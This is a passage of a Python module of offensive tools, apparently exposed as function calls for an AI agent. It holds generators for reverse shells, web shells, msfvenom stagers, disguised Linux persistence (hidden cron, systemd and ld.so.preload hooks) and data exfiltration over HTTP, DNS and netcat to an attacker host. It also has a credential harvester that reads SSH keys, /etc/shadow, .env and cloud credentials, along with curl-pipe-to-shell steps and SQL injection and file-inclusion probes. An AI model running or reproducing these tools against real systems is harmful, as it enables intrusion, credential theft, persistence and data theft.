        'old','dev','staging','test','temp','tmp','error_log','access_log',
        'swagger','swagger-ui','swagger.json','openapi.json','api-docs',
        'graphql','graphiql','actuator','health','metrics','trace','env',
        '.DS_Store','Thumbs.db','.bash_history','.ssh/id_rsa',
        'id_rsa','authorized_keys',
    ]
    paths = wordlist.split(',') if isinstance(wordlist, str) and wordlist else BUILTIN
    exts = [e.strip().lstrip('.') for e in str(extensions).replace(',',' ').split()] if extensions else []
    all_paths = list(paths) + [f'{p}.{e}' for p in paths for e in exts]

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    found = []
    lock = _th.Lock()
    q = Queue()
    for p in all_paths:
        q.put(p)

    def worker():
        while True:
            try:
                path = q.get_nowait()
            except Exception:
                return
            target = f'{base}/{path}'
            req = urllib.request.Request(target, headers={'User-Agent': 'Mozilla/5.0',
                                                          'Accept': '*/*'})
            try:
                resp = urllib.request.urlopen(req, timeout=int(timeout), context=ctx)
                code = resp.status
            except urllib.error.HTTPError as e:
                code = e.code
            except Exception:
                q.task_done()
                continue
            if code not in (404, 400):
                with lock:
                    found.append({'path': f'/{path}', 'url': target, 'status': code})
            q.task_done()

    workers = [_th.Thread(target=worker, daemon=True) for _ in range(min(int(threads), 20))]
    for w in workers:
        w.start()
    q.join()

    return json.dumps({'base_url': base, 'tested': len(all_paths), 'found': len(found),
                       'results': sorted(found, key=lambda x: x['status'])}, indent=2)


# ── jwt_decode ────────────────────────────────────────────────────────────────

def jwt_decode(token, secret=None, **_):
    """Decode a JWT without signature verification; test weak secrets automatically."""
    import hmac as _hmac
    import time as _t

    token = token.strip()
    parts = token.split('.')
    if len(parts) != 3:
        return json.dumps({'error': f'Invalid JWT: {len(parts)} parts (expected 3)'}, indent=2)

    def b64d(s):
        s = s.replace('-','+').replace('_','/')
        s += '=' * (-len(s) % 4)
        return json.loads(base64.b64decode(s).decode('utf-8', errors='replace'))

    try:
        header  = b64d(parts[0])
        payload = b64d(parts[1])
    except Exception as e:
        return json.dumps({'error': f'Decode error: {e}'}, indent=2)

    now = int(_t.time())
    exp = payload.get('exp')
    iat = payload.get('iat')

    result = {
        'header': header, 'payload': payload, 'signature': parts[2],
        'alg': header.get('alg','unknown'),
        'expired': (exp is not None and exp < now),
        'exp': datetime.utcfromtimestamp(exp).isoformat()+'Z' if exp else None,
        'iat': datetime.utcfromtimestamp(iat).isoformat()+'Z' if iat else None,
    }

    if header.get('alg','').upper() == 'NONE':
        result['VULN'] = 'alg=none — server may accept unsigned tokens!'

    alg_map = {'HS256': hashlib.sha256, 'HS384': hashlib.sha384, 'HS512': hashlib.sha512}
    alg = header.get('alg','').upper()
    if alg in alg_map:
        h_fn = alg_map[alg]
        sig_input = (parts[0]+'.'+parts[1]).encode()

        WEAK = ['secret','password','123456','qwerty','admin','test','secret123',
                'your-256-bit-secret','jwt_secret','supersecret','changeme',
                'letmein','hack','1234','pass','default','jwt','key','']
        if secret:
            WEAK.insert(0, secret)

        for w in WEAK:
            expected = base64.urlsafe_b64encode(
                _hmac.new(w.encode(), sig_input, h_fn).digest()
            ).rstrip(b'=').decode()
            if expected == parts[2]:
                result['CRACKED'] = f'Weak secret: "{w}"'
                break

    return json.dumps(result, indent=2)


# ── generate_payload ──────────────────────────────────────────────────────────

def generate_payload(payload_type, lhost=None, lport=None, **_):
    """Generate reverse shells, web shells, MSF stagers, TTY upgrade commands."""
    ptype = (payload_type or '').lower().strip()
    h = lhost or 'LHOST'
    p = str(lport or 'LPORT')

    P = {
        # Reverse shells
        'bash':      f'bash -i >& /dev/tcp/{h}/{p} 0>&1',
        'bash_mkfifo': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {h} {p} >/tmp/f',
        'bash_196':  f'0<&196;exec 196<>/dev/tcp/{h}/{p}; sh <&196 >&196 2>&196',
        'python3':   f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{h}\",{p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        'python2':   f"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{h}\",{p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        'php':       f"php -r '$sock=fsockopen(\"{h}\",{p});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        'php_proc':  f"php -r '$sock=fsockopen(\"{h}\",{p});$proc=proc_open(\"/bin/sh -i\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'",
        'nc':        f'nc -e /bin/sh {h} {p}',
        'ncat':      f'ncat {h} {p} -e /bin/bash',
        'nc_mkfifo': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {h} {p} >/tmp/f',
        'perl':      f"perl -e 'use Socket;\$i=\"{h}\";\$p={p};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        'ruby':      f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{h}\",{p});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
        'socat':     f'socat tcp-connect:{h}:{p} exec:bash,pty,stderr,setsid,sigint,sane',
        'powershell': f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{h}',{p});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=([Text.Encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($rb,0,$rb.Length);$s.Flush()}};$c.Close()\"",
        'golang':    f'package main;import("net";"os/exec");func main(){{c,_:=net.Dial("tcp","{h}:{p}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}',
        # Web shells
        'php_ws':    '<?php system($_GET["cmd"]); ?>',
        'php_ws_post':'<?php echo "<pre>";system($_POST["c"]);echo "</pre>"; ?>',
        'php_b64':   '<?php eval(base64_decode($_POST["c"])); ?>',
        'asp_ws':    '<%eval request("cmd")%>',
        'jsp_ws':    '<%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>',
        # Listeners
        'nc_listen': f'nc -lvnp {p}',
        'ncat_listen':f'ncat -lvnp {p}',
        'socat_listen':f'socat -d -d TCP-LISTEN:{p},fork,reuseaddr EXEC:/bin/bash,pty,stderr,setsid,sigint,sane',
        # TTY upgrades
        'tty_python':'python3 -c \'import pty;pty.spawn("/bin/bash")\'',
        'tty_script':'script /dev/null -c bash',
        'tty_stty':  'Ctrl+Z → stty raw -echo; fg → reset → export SHELL=bash TERM=xterm; stty rows 38 cols 116',
        # MSFvenom
        'msf_elf':   f'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={h} LPORT={p} -f elf -o shell.elf',
        'msf_exe':   f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={h} LPORT={p} -f exe -o shell.exe',
        'msf_php':   f'msfvenom -p php/meterpreter/reverse_tcp LHOST={h} LPORT={p} -f raw -o shell.php',
        'msf_war':   f'msfvenom -p java/meterpreter/reverse_tcp LHOST={h} LPORT={p} -f war -o shell.war',
        'msf_ps1':   f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={h} LPORT={p} -f psh-cmd',
        'msf_handler':f'msfconsole -q -x "use exploit/multi/handler;set payload linux/x64/meterpreter/reverse_tcp;set LHOST {h};set LPORT {p};run"',
    }

    if ptype == 'list':
        return json.dumps({'available': sorted(P.keys())}, indent=2)
    if ptype not in P:
        return json.dumps({'error': f'Unknown: "{payload_type}"', 'available': sorted(P.keys())}, indent=2)

    return json.dumps({'type': ptype, 'lhost': h, 'lport': p, 'payload': P[ptype]}, indent=2)


# ── net_recon ─────────────────────────────────────────────────────────────────

def net_recon(**_):
    """Local network recon: interfaces, routes, ARP, listening ports, connections."""

    def run(cmd, t=8):
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
            return r.stdout.strip()
        except Exception:
            return ''

    return json.dumps({
        'interfaces':      run('ip addr show 2>/dev/null || ifconfig -a 2>/dev/null'),
        'routes':          run('ip route show 2>/dev/null || netstat -rn 2>/dev/null'),
        'arp':             run('ip neigh show 2>/dev/null || arp -n 2>/dev/null'),
        'listening_tcp':   run('ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null'),
        'listening_udp':   run('ss -ulnp 2>/dev/null || netstat -ulnp 2>/dev/null'),
        'established':     run('ss -tnp state established 2>/dev/null | head -30'),
        'dns':             run('cat /etc/resolv.conf 2>/dev/null'),
        'hosts':           run('cat /etc/hosts 2>/dev/null'),
        'firewall':        run('iptables -L -n 2>/dev/null | head -50 || nft list ruleset 2>/dev/null | head -40'),
        'open_sockets':    run('lsof -i -n -P 2>/dev/null | head -40'),
    }, indent=2)


# ── cred_harvest ──────────────────────────────────────────────────────────────

def cred_harvest(**_):
    """Search filesystem for credentials, keys, histories, tokens, and config files."""

    def run(cmd, t=15):
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
            return r.stdout.strip()
        except Exception:
            return ''

    SEARCH = '/home /root /opt /var/www /etc /srv'
    return json.dumps({
        'shell_history':    run('for f in ~/.bash_history ~/.zsh_history /root/.bash_history; do [ -r "$f" ] && echo "=== $f ===" && head -50 "$f"; done 2>/dev/null'),
        'ssh_keys':         run('find / \\( -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "*.pem" \\) -type f 2>/dev/null | head -20'),
        'ssh_key_contents': run('find / \\( -name "id_rsa" -o -name "id_ed25519" \\) -readable -type f 2>/dev/null | head -5 | xargs cat 2>/dev/null'),
        'dotenv_files':     run('find ' + SEARCH + ' \\( -name ".env" -o -name "*.env" \\) 2>/dev/null | head -20'),
        'dotenv_contents':  run('find ' + SEARCH + ' \\( -name ".env" -o -name "*.env" \\) 2>/dev/null | xargs grep -l "." 2>/dev/null | while read f; do echo "=== $f ==="; cat "$f" 2>/dev/null | head -20; done | head -80'),
        'db_creds':         run('grep -rn --include="*.php" --include="*.py" --include="*.rb" --include="*.js" --include="*.conf" --include="*.yaml" --include="*.yml" -E "(DB_PASS|DATABASE_URL|mysql://|postgres://|mongodb://|REDIS_URL)" ' + SEARCH + ' 2>/dev/null | grep -v "^Binary" | head -30'),
        'api_keys':         run('grep -rn --include="*.py" --include="*.js" --include="*.rb" --include="*.php" --include="*.yaml" --include="*.json" -iE "(api_key|api_secret|access_key|secret_key|auth_token)" ' + SEARCH + ' 2>/dev/null | grep -v "^Binary" | grep -iv "example\\|sample\\|dummy" | head -30'),
        'shadow_passwd':    run('cat /etc/shadow 2>/dev/null | head -20; cat /etc/passwd 2>/dev/null | grep -vE "nologin|false|sync"'),
        'git_creds':        run('find / \\( -name ".git-credentials" -o -name ".netrc" \\) -readable 2>/dev/null | xargs cat 2>/dev/null | head -30'),
        'cloud_creds':      run('cat ~/.aws/credentials 2>/dev/null; cat ~/.aws/config 2>/dev/null; find / -name "credentials.json" -path "*gcloud*" 2>/dev/null | head -3 | xargs cat 2>/dev/null'),
        'wp_config':        run('find / -name "wp-config.php" 2>/dev/null | xargs grep -E "DB_USER|DB_PASSWORD|AUTH_KEY" 2>/dev/null | head -20'),
        'history_passwords':run('grep -ihE "(password|passwd|pass|secret|token|key|api).*=.*\\S" ~/.bash_history ~/.zsh_history 2>/dev/null | head -30'),
    }, indent=2)


# ── generate_persist ──────────────────────────────────────────────────────────

def generate_persist(method, cmd=None, lhost=None, lport=None, **_):
    """Generate Linux persistence mechanism commands."""
    meth = (method or '').lower().strip()
    command = (cmd or (f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
                       if lhost and lport else '/tmp/.bd/shell'))

    MECHS = {
        'cron': {
            'desc': 'User crontab firing every minute',
            'steps': [f'(crontab -l 2>/dev/null; echo "* * * * * {command}") | crontab -'],
        },
        'cron_etc': {
            'desc': 'System cron via /etc/cron.d (needs root)',
            'steps': [f'printf "* * * * * root {command}\\n" > /etc/cron.d/.sysupdate', 'chmod 644 /etc/cron.d/.sysupdate'],
        },
        'bashrc': {
            'desc': 'Hook ~/.bashrc / ~/.profile (fires on new shell)',
            'steps': [f'echo "{command} &" >> ~/.bashrc', f'echo "{command} &" >> ~/.bash_profile', f'echo "{command} &" >> ~/.profile'],
        },
        'systemd': {
            'desc': 'System-wide systemd service (needs root)',
            'steps': [
                f'''cat > /etc/systemd/system/net-sync.service << 'EOF'
[Unit]
Description=Network Sync
After=network.target
[Service]
Type=simple
Restart=always
RestartSec=60
ExecStart=/bin/bash -c "{command}"
[Install]
WantedBy=multi-user.target
EOF''',
                'systemctl daemon-reload && systemctl enable --now net-sync.service',
            ],
        },
        'systemd_user': {
            'desc': 'User systemd service (no root needed)',
            'steps': [
                'mkdir -p ~/.config/systemd/user',
                f'''cat > ~/.config/systemd/user/dbus-sync.service << 'EOF'
[Unit]
Description=DBus Sync
[Service]
Type=simple
Restart=always
RestartSec=60
ExecStart=/bin/bash -c "{command}"
[Install]
WantedBy=default.target
EOF''',
                'systemctl --user daemon-reload && systemctl --user enable --now dbus-sync.service',
                'loginctl enable-linger $USER',
            ],
        },
        'ssh_key': {
            'desc': 'Add attacker public key to authorized_keys',
            'steps': ['mkdir -p ~/.ssh && chmod 700 ~/.ssh',
                      'echo "PASTE_ATTACKER_PUBKEY_HERE" >> ~/.ssh/authorized_keys',
                      'chmod 600 ~/.ssh/authorized_keys'],
        },
        'rc_local': {
            'desc': '/etc/rc.local (needs root)',
            'steps': [f'echo "{command} &" >> /etc/rc.local', 'chmod +x /etc/rc.local'],
        },
        'motd': {
            'desc': '/etc/update-motd.d hook (needs root)',
            'steps': [f'printf "#!/bin/bash\\n{command} &\\n" > /etc/update-motd.d/00-header', 'chmod +x /etc/update-motd.d/00-header'],
        },
        'ld_preload': {
            'desc': 'LD_PRELOAD shared-object hook (advanced)',
            'steps': [
                f"printf '#include <stdio.h>\\n__attribute__((constructor)) void p(){{system(\"{command}\");}}\\n' > /tmp/h.c",
                'gcc -shared -fPIC /tmp/h.c -o /tmp/h.so -nostartfiles',
                'echo "/tmp/h.so" >> /etc/ld.so.preload  # root',
                'export LD_PRELOAD=/tmp/h.so  # current user',
            ],
        },
        'at': {
            'desc': 'One-shot via at command (use at+cron for repeat)',
            'steps': [f'echo "{command}" | at now + 1 minute'],
        },
    }

    if meth == 'list':
        return json.dumps({'methods': {k: v['desc'] for k, v in MECHS.items()}}, indent=2)
    if meth not in MECHS:
        return json.dumps({'error': f'Unknown: "{method}"', 'available': list(MECHS)}, indent=2)

    m = MECHS[meth]
    return json.dumps({'method': meth, 'description': m['desc'],
                       'command': command, 'steps': m['steps']}, indent=2)


# ── kernel_suggest ────────────────────────────────────────────────────────────

def kernel_suggest(**_):
    """Suggest kernel/local privilege escalation exploits based on detected versions."""

    def run(cmd, t=5):
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
            return r.stdout.strip()
        except Exception:
            return ''

    kernel_str = run('uname -r')
    if not kernel_str:
        return json.dumps({'error': 'Could not detect kernel version'}, indent=2)

    distro = run("grep PRETTY_NAME /etc/os-release 2>/dev/null | cut -d= -f2 | tr -d '\"'")
    arch = run('uname -m')

    m = re.match(r'^(\d+)\.(\d+)\.(\d+)', kernel_str)
    maj, min_, pat = (int(m.group(i)) for i in (1,2,3)) if m else (0,0,0)

    def ver(*args):
        return (maj, min_, pat) <= args

    EXPLOITS = [
        ('CVE-2022-0847','Dirty Pipe',
         maj == 5 and 8 <= min_ <= 16,
         'Overwrite any read-only file via pipe. Trivial root.',
         ['https://dirtypipe.cm4all.com/','https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits']),
        ('CVE-2021-4034','PwnKit (pkexec)',
         os.path.exists('/usr/bin/pkexec'),
         'Memory corruption in pkexec → root on all major distros.',
         ['https://github.com/ly4k/PwnKit']),
        ('CVE-2021-3156','Sudo Baron Samedit',
         True,
         'Heap overflow in sudo < 1.9.5p2. Test: sudoedit -s \\ → segfault?',
         ['https://github.com/blasty/CVE-2021-3156']),
        ('CVE-2016-5195','Dirty COW',
         maj < 4 or (maj == 4 and min_ < 8),
         'Race condition in mm/gup.c → overwrite read-only mappings.',
         ['https://dirtycow.ninja/']),
        ('CVE-2023-0386','OverlayFS SUID',
         maj == 6 and min_ < 2,
         'OverlayFS copy-up of SUID files → root via FUSE.',
         ['https://github.com/xkaneiki/CVE-2023-0386']),
        ('CVE-2023-4911','Looney Tunables (glibc)',
         True,
         'Buffer overflow in GLIBC_TUNABLES LD_PRELOAD → root.',
         ['https://github.com/leesh3288/CVE-2023-4911']),
        ('CVE-2023-2640/32629','GameOver(lay) Ubuntu',
         'ubuntu' in distro.lower() or 'ubuntu' in kernel_str.lower(),
         'Ubuntu overlayfs → trivial local root.',
         ['https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629']),
        ('CVE-2022-2588','cls_route UAF',
         maj == 5 and min_ <= 18,
         'UAF in net/sched → LPE on Linux 5.x.',
         ['https://github.com/Markakd/CVE-2022-2588']),
    ]

    hits = [{'cve': cve, 'name': name, 'description': desc, 'references': refs}
            for cve, name, cond, desc, refs in EXPLOITS if cond]

    return json.dumps({
        'kernel': kernel_str, 'distro': distro, 'arch': arch,
        'sudo': run('sudo --version 2>/dev/null | head -1'),
        'pkexec': os.path.exists('/usr/bin/pkexec'),
        'suggestions': hits,
        'next_steps': [
            f'searchsploit linux kernel {maj}.{min_}',
            'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh',
            'wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash',
        ],
    }, indent=2)


# ── exfil_payload ─────────────────────────────────────────────────────────────

def exfil_payload(method, data_source=None, lhost=None, lport=None, **_):
    """Generate data exfiltration commands for HTTP, DNS, netcat, SCP, and more."""
    meth = (method or '').lower().strip()
    h = lhost or 'LHOST'
    p = str(lport or '443')
    src = data_source or '/etc/passwd'
    fname = os.path.basename(src)

    E = {
        'http_curl':     f'curl -s -X POST -d @{src} http://{h}:{p}/upload',
        'https_curl':    f'curl -sk -X POST -d @{src} https://{h}:{p}/upload',
        'http_wget':     f'wget -q --post-file={src} http://{h}:{p}/upload',
        'tar_https':     f'tar czf - {src} | curl -sk -X POST --data-binary @- https://{h}:{p}/upload',
        'nc_send':       f'cat {src} | nc {h} {p}',
        'nc_recv':       f'nc -lvnp {p} > received_{fname}',
        'dns_b64':       f"cat {src} | base64 -w0 | fold -w 50 | while read c; do host \"$c.{h}\"; done",
        'dns_hex':       f"xxd -p {src} | tr -d '\\n' | fold -w 56 | while read c; do dig \"$c.{h}\" @{h}; done",
        'scp':           f'scp {src} attacker@{h}:{fname}',
        'rsync':         f'rsync -avz {src} attacker@{h}:/tmp/{fname}',
        'b64_stdout':    f'cat {src} | base64 -w0',
        'xxd_stdout':    f'xxd -p {src} | tr -d "\\n"',
        'smb':           f'cp {src} //{h}/share/{fname}',
        'ftp':           f'ftp -n {h} {p} <<EOF\nuser anonymous anonymous\nbinary\nput {src}\nquit\nEOF',
        'icmp':          f"ping -c 1 $(cat {src} | base64 | head -c 60).{h}",
        'python_http':   f"python3 -c \"import urllib.request; urllib.request.urlopen(urllib.request.Request('http://{h}:{p}/', open('{src}','rb').read()))\"",
        'server':        f'python3 -m http.server {p}',
    }

    if meth == 'list':
        return json.dumps({'available': sorted(E.keys())}, indent=2)
    if meth not in E:
        return json.dumps({'error': f'Unknown: "{method}"', 'available': sorted(E.keys())}, indent=2)

    return json.dumps({'method': meth, 'lhost': h, 'lport': p,
                       'data_source': src, 'command': E[meth]}, indent=2)


# ── sqli_probe ────────────────────────────────────────────────────────────────

def sqli_probe(url, params=None, method='GET', **_):
    """Test URL parameters for SQL injection (error-based and blind time-based)."""
    import time as _t

    PAYLOADS_ERR  = ["'", '"', "' OR '1'='1", "' OR 1=1--", "1' ORDER BY 1--",
                     "1 AND 1=2--", "';--", "' OR 'x'='x", "1; SELECT SLEEP(0)--"]
    PAYLOADS_TIME = ["' AND SLEEP(3)--", "' AND (SELECT SLEEP(3))--",
                     "'; WAITFOR DELAY '0:0:3'--", "1;WAITFOR DELAY '0:0:3'--"]
    ERROR_RE = [r'SQL syntax',r'mysql_fetch',r'ORA-\d+',r'PG::SyntaxError',
                r'Microsoft SQL',r'SQLite3::Exception',r'SQLSTATE',
                r'You have an error in your SQL syntax',r'Unclosed quotation',
                r'quoted string not properly terminated',r'ODBC Driver']

    parsed = urllib.parse.urlparse(url)
    base   = parsed._replace(query='').geturl()

    if params:
        param_dict = params if isinstance(params, dict) else dict(urllib.parse.parse_qsl(params))
    else:
        param_dict = dict(urllib.parse.parse_qsl(parsed.query))

    if not param_dict:
        return json.dumps({'error': 'No parameters found.'}, indent=2)

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def req(pdict, timeout=5):
        qs = urllib.parse.urlencode(pdict)
        if method.upper() == 'GET':
            r = urllib.request.Request(f'{base}?{qs}', headers={'User-Agent': 'Mozilla/5.0'})
        else:
            r = urllib.request.Request(base, data=qs.encode(),
                                        headers={'User-Agent': 'Mozilla/5.0',
                                                 'Content-Type': 'application/x-www-form-urlencoded'},
                                        method='POST')
        start = _t.time()
        try:
            resp = urllib.request.urlopen(r, timeout=timeout, context=ctx)
            return resp.read(4096).decode('utf-8', errors='replace'), int((_t.time()-start)*1000)
        except urllib.error.HTTPError as e:
            body = e.read(4096).decode('utf-8', errors='replace') if hasattr(e,'read') else ''
            return body, int((_t.time()-start)*1000)
        except Exception:
            return '', 0

    findings = []
    for pname, oval in param_dict.items():
        for pl in PAYLOADS_ERR:
            t = dict(param_dict); t[pname] = oval + pl
            body, _ = req(t)
            match = next((re.search(pat, body, re.I) for pat in ERROR_RE if re.search(pat, body, re.I)), None)
            if match:
                findings.append({'type': 'error_based', 'parameter': pname,
                                  'payload': pl, 'evidence': match.group(0), 'severity': 'CRITICAL'})
                break
        for pl in PAYLOADS_TIME:
            t = dict(param_dict); t[pname] = oval + pl
            _, ms = req(t, timeout=6)
            if ms > 2500:
                findings.append({'type': 'time_based', 'parameter': pname,
                                  'payload': pl, 'delay_ms': ms, 'severity': 'CRITICAL'})
                break

    return json.dumps({
        'url': url, 'params_tested': list(param_dict.keys()),
        'vulnerable': bool(findings), 'findings': findings,
        'next': [f'sqlmap -u "{url}" --dbs --batch'] if findings else [],
    }, indent=2)


# ── lfi_probe ─────────────────────────────────────────────────────────────────

def lfi_probe(url, param=None, **_):
    """Test URL parameters for Local File Inclusion (LFI) path traversal."""
    TRAVERSALS = [
        '../../../../../../../../../../../etc/passwd',
        '..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
        '....//....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '/etc/passwd',
        '/etc/passwd%00',
        'php://filter/convert.base64-encode/resource=/etc/passwd',
        'php://filter/read=convert.base64-encode/resource=../config.php',
        'file:///etc/passwd',
        '../../../etc/shadow',
        'C:/windows/win.ini',
        '../../../../../../windows/win.ini',
    ]
    INDICATORS = ['root:x:0:0:','root:*:0:0:','daemon:x:','nobody:x:','[fonts]','[extensions]']

    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    params_to_test = [param] if param else list(params.keys())
    if not params_to_test:
        return json.dumps({'error': 'No parameters found in URL.'}, indent=2)

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    base = parsed._replace(query='').geturl()
    findings = []

    for pname in params_to_test:
        for pl in TRAVERSALS:
            t = dict(params); t[pname] = pl
            test_url = f'{base}?{urllib.parse.urlencode(t)}'
            try:
                req = urllib.request.Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                resp = urllib.request.urlopen(req, timeout=8, context=ctx)
                body = resp.read(8192).decode('utf-8', errors='replace')
            except urllib.error.HTTPError as e:
                body = e.read(4096).decode('utf-8', errors='replace') if hasattr(e,'read') else ''
            except Exception:
                continue
            hit = next((ind for ind in INDICATORS if ind in body), None)
            if hit:
                findings.append({'parameter': pname, 'payload': pl, 'indicator': hit,
                                  'url': test_url, 'preview': body[:400], 'severity': 'CRITICAL'})
                break

    return json.dumps({'url': url, 'params_tested': params_to_test,
                       'vulnerable': bool(findings), 'findings': findings}, indent=2)


# ── Schema definitions ─────────────────────────────────────────────────────────

SECURITY_TOOLS_SCHEMA = [
    {
        "type": "function",
        "function": {
            "name": "http_probe",
            "description": (
                "Make an HTTP/HTTPS request and return structured response info: "
                "status code, all headers, body preview (first 3 KB), redirect chain, "
                "and TLS certificate details. Better than curl for recon because output "
                "is structured JSON the model can parse directly."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "Full URL to probe (http:// or https://)"},
                    "method": {"type": "string", "description": "HTTP method: GET (default), POST, PUT, HEAD, OPTIONS, DELETE, PATCH"},
                    "headers": {"type": "string", "description": "Extra request headers, one per line: 'Header-Name: value'"},
                    "data": {"type": "string", "description": "Request body for POST/PUT; raw string or key=value&key2=value2"},
                    "follow_redirects": {"type": "boolean", "description": "Follow HTTP redirects (default true)"},
                    "timeout": {"type": "integer", "description": "Timeout in seconds (default 15)"},
                    "verify_ssl": {"type": "boolean", "description": "Verify TLS certificate (default false — allows self-signed certs)"},
                },
                "required": ["url"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "encode_decode",
            "description": (
                "Encode or decode a string using common formats. "
                "Supports: base64, base64url, hex, url (percent), html, htmldec, rot13, binary, utf8. "
                "Essential for CTF payload crafting, cookie/token analysis, and obfuscation."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "data": {"type": "string", "description": "The string to encode or decode"},
                    "operation": {"type": "string", "description": "'encode' or 'decode'"},
                    "encoding": {"type": "string", "description": "Format: base64 | base64url | hex | url | html | htmldec | rot13 | binary | utf8"},
                },
                "required": ["data", "operation", "encoding"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "hash_data",
            "description": (
                "Compute MD5, SHA-1, SHA-256, SHA-512 (and more) hashes of a string in one call. "
                "Useful for password cracking prep, file integrity, and CTF challenge solving."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "data": {"type": "string", "description": "The string to hash"},
                    "algorithms": {"type": "string", "description": "Comma-separated algorithm list (default: all). Options: md5, sha1, sha224, sha256, sha384, sha512"},
                },
                "required": ["data"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "identify_hash",
            "description": (
                "Identify the likely hash algorithm(s) from a hash string by length and character set. "
                "Returns candidates with confidence scores and the matching hashcat -m mode. "
                "Use before attempting to crack a hash when the algorithm is unknown."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "hash_string": {"type": "string", "description": "The hash to identify (hex, base64, or $format)"},
                },
                "required": ["hash_string"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "file_entropy",
            "description": (
                "Calculate Shannon entropy of a file (0–8 bits/byte) and detect its type from magic bytes. "
                "~8.0 = encrypted or compressed; 6–7 = packed binary; <4 = plain text. "
                "Use before reversing or strings to decide if unpacking is needed first."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "Absolute or ~-relative path to the file"},
                },
                "required": ["path"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "check_linux_privesc",
            "description": (
                "Run a comprehensive Linux privilege escalation check. "
                "Covers: NOPASSWD sudo, SUID/SGID GTFOBins, writable /etc, cron jobs, "
                "Linux capabilities, Docker/LXD socket, /etc/shadow readable, NFS no_root_squash, "
                "readable SSH keys, hardcoded config credentials, env secrets, world-writable PATH dirs. "
                "Returns a severity-ranked JSON report (CRITICAL / HIGH / INFO). "
                "Run this immediately after gaining a shell."
            ),
            "parameters": {"type": "object", "properties": {}, "required": []}
        }
    },
    {
        "type": "function",
        "function": {
            "name": "port_scan",
            "description": (
                "TCP connect scan a host. Probes common ports by default (22,80,443,3306,…) "
                "or a custom range/list. Returns open ports with service names and banners. "
                "Pure Python — no nmap required."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "host":    {"type": "string",  "description": "Target hostname or IP"},
                    "ports":   {"type": "string",  "description": "Comma-separated ports or range e.g. '22,80,443' or '1-1024' (default: top 27 common ports)"},
                    "timeout": {"type": "number",  "description": "Per-port connect timeout in seconds (default 1)"},
                    "banner":  {"type": "boolean", "description": "Try to grab service banner (default true)"},
                },
                "required": ["host"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "dns_enum",
            "description": (
                "Enumerate DNS records for a domain (A, AAAA, MX, NS, TXT, CNAME, SOA, SRV), "
                "attempt a zone transfer (AXFR) against each nameserver, and brute-force common "
                "subdomains. No external dependencies — uses dig/host + Python socket."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "domain":       {"type": "string", "description": "Target domain e.g. example.com"},
                    "record_types": {"type": "string", "description": "Comma-separated record types to query (default: A AAAA MX NS TXT CNAME SOA SRV)"},
                    "wordlist":     {"type": "string", "description": "Comma-separated subdomain prefixes to brute-force (default: built-in 30-word list)"},
                },
                "required": ["domain"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "web_fingerprint",
            "description": (
